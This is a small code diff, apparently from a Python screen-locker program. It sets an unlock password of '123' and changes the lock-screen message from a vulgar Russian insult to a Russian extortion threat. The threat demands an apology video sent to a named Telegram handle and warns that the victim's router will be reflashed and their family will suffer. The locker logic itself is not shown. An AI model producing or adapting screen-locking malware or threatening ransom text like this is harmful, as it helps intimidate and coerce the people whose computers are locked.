@@ -16,7 +16,7 @@ import keyboard
 import sys
 
 password = "123"
-lock_text = "windows blocked.tobi pizda"
+lock_text = "Привет если не скинешь видео со своими извенениями в мой тг я перепрошью твой роутер и твоей семье придется не сладко .мой тг-@imadshax"
 count = 3
 
 
